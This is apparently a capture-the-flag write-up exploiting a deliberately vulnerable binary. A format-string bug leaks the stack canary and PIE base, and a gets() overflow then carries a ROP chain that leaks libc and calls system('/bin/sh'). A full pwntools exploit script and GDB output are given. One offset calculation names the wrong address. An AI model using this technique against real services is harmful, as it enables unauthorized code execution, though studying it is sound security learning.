# Analysis #

`file main` 
```
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=169919c69544bc1683cd6b92a6ebab347eddbcc4, for GNU/Linux 3.2.0, not stripped
```

`checksec main`
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations are enabled, this might be interesting!

# Decompilation #

`main()`
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  get_name();
  puts("So let\'s get into business, give me a secret to exploit me :).");
  gets(local_48);
  puts("Bye, good luck next time :D ");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

`main()` does some initialization, then calls the function `get_name()` and then reads in unlimited bytes into a buffer of length 56 (local_48).


`get_name()`
```c
void get_name(void)

{
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Please fill in your name:");
  read(0,local_38,0x1e);
  printf("Thank you ");
  printf(local_38);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
 
```

`get_name()` asks us to give it a name and then passes whatever it reads in to `printf()`


From this code we learn that: 

- `main()` is vulnerable to a stack based buffer overflow. 
- `get_name()` is vulnerable to a format-string vulnerability since we control the first argument going into `printf()`

# Exploitation Strategy #

We know that main() is vulnerable to a buffer overflow, however since all mitigations, including stack-cookies are enabled, we can't just perform a straight-forward `saved rip overwrite` since that would smash the stack cookie and kill the program.

Luckily we also have a format string vulnerability, which we can use to leak arbitrary memory from the stack. The stack should contain the stack cookie. 

Besides needing to know the stack cookie, we also need to defeat **PIE** by leaking the return address of `get_name()` from the stack. From this leaked address we can calculate the randomized **base address** of the application. 

The reason we need to defeat **PIE** is so we can use gadgets from the binary to craft a rop chain.

## 64-bit format string exploitation ## 

We can use the format specifier %p to print out arguments that were passed to printf. Since 64-bit function calling conventions stores the first 6 arguments inside registers and whichever arguments beyond that on the stack, we can use a specifier like `%7$p` to leak a value from the stack. 

To visualize this, lets start the program under `gdb` and inspect what the stack looks like when we enter `printf()`

`gdb ./main`

Now put a breakpoint on `printf()` with 

`break printf` 

And run the program with

`run` 

We are now prompted for our name, let's put in `%7$p.%8$p.%9$p`. When we hit enter GDB should be breaking on `printf()`. 

Let's inspect the stack:

```
gef➤  x/16gx $rsp
0x7fffffffde18:	0x000055555555523c	0x2438252e70243725
0x7fffffffde28:	0x000a702439252e70	0x0000000000000000
0x7fffffffde38:	0x00007fffffffdea0	0x00007fffffffdfb8
0x7fffffffde48:	0x36a8affd9f0bfa00	0x00007fffffffdea0
0x7fffffffde58:	0x00005555555552c5	0x0000000000000000
0x7fffffffde68:	0x0000000000000000	0x0000000000000000
0x7fffffffde78:	0x0000000000000000	0x0000000000000000
0x7fffffffde88:	0x0000000000000000	0x0000000000000000
```

Now, continue running the program by entering `c` twice.

We should be getting output as follows: 

```
0xa702439252e70.(nil).0x7fffffffdea0
So let's get into business, give me a secret to exploit me :).
```

Notice how our format specifiers correspond to the memory contents on the stack: 

```
0x7fffffffde18:	0x000055555555523c	0x2438252e70243725 
0x7fffffffde28:	0x000a702439252e70	0x0000000000000000 
                ^  %7$p             ^ %8$p
0x7fffffffde38:	0x00007fffffffdea0	0x00007fffffffdfb8
                ^  %9$p             ^ %10$p 
0x7fffffffde48:	0x36a8affd9f0bfa00	0x00007fffffffdea0
                ^  %11$p            ^ %12$p
0x7fffffffde58:	0x00005555555552c5	0x0000000000000000
                ^  %13$p            etc etc etc
0x7fffffffde68:	0x0000000000000000	0x0000000000000000

```

Remember, our goal here is to leak 
- the stack cookie
- a return address so we can defeat **PIE**

Notice that `%11$p` refers to the stack cookie `0x36a8affd9f0bfa00` and `%13$p` refers to the return address of `get_name()` back into `main()` 

```
        001012c0 e8 24 ff        CALL       get_name                                         undefined get_name()
                 ff ff
        001012c5 48 8d 3d        LEA        RDI,[s_So_let's_get_into_business,_give_001020   = "So let's get into business, g
                 64 0d 00 00
```

Since we are running this binary under GDB currently, the actual base address is not randomized for debugging purposes. From the command `vmmap` we can see that the binary is always mapped at `0x00555555554000`, this means that our leaked return address `0x00005555555552c5` is at offset 0x000055555555523c - 0x00555555554000 = 0x00012c5 from the PIE base address.

So, in order to figure out the randomized PIE base address, we need to substract 0x12c5 from our leaked address.

# Exploit #

```python
#!/usr/bin/env python3 
from pwn import *

context.update(arch="amd64")

r = process("./main")


###
### Stage 1: Leak stack cookie and PIE
###

# format string payload, we know that cookie is at %11 and return address at %13
fmt_payload = b"%11$p.%13$p"

pause()
r.sendlineafter(b"Please fill in your name:\n", fmt_payload)

r.recvuntil(b"Thank you ")

# parse leaks 
pie_leak_offset = 0x12c5

# receive raw data and split it on the . 
leaks = r.recvline().strip().split(b".")

# calculate pie_base
pie_base = int(leaks[1], 16) - pie_leak_offset
print(f"pie_base: {hex(pie_base)}")

# parse cookie leak 
cookie_leak = int(leaks[0], 16)
print(f"cookie: {hex(cookie_leak)}")

r.recvuntil(b"give me a secret to exploit me :).\n")

###
### Stage 2 : ROP chain to leak LIBC
###

# load ELF binary
e = ELF("./main")
# update address with leaked randomized pie_base
e.address = pie_base
# prepare rop module so we can grab gadgets
rop = ROP(e)

gadgets = [
    rop.find_gadget(['pop rdi', 'ret']).address,
    e.got['puts'],
    e.plt['puts'],
    e.symbols['main']
]


payload = b"A" * 56 + p64(cookie_leak) + b"B" * 8 + b"".join(p64(gadget) for gadget in gadgets)

r.sendline(payload)

# parse libc leak 
r.recvuntil(b"Bye, good luck next time :D \n")
libc_leak = u64(r.recvline().strip().ljust(8, b"\x00"))
print(f"puts@libc: {hex(libc_leak)}")

# calc libc_base and build final payload 
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc_base = libc_leak - libc.symbols['puts']
# update libc base address
libc.address = libc_base
print(f"libc_base: {hex(libc_base)}")


### 
### Stage 3 : ROP chain to execute system("/bin/sh")
###

r.sendlineafter(b"Please fill in your name:\n", b"AAA")
r.recvuntil(b"give me a secret to exploit me :).\n")

gadgets = [
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b"/bin/sh\x00")),
    rop.find_gadget(['ret']).address,
    libc.symbols['system']
]


payload = b"A" * 56 + p64(cookie_leak) + b"B" * 8 + b"".join(p64(gadget) for gadget in gadgets)

r.sendline(payload)

r.interactive()
```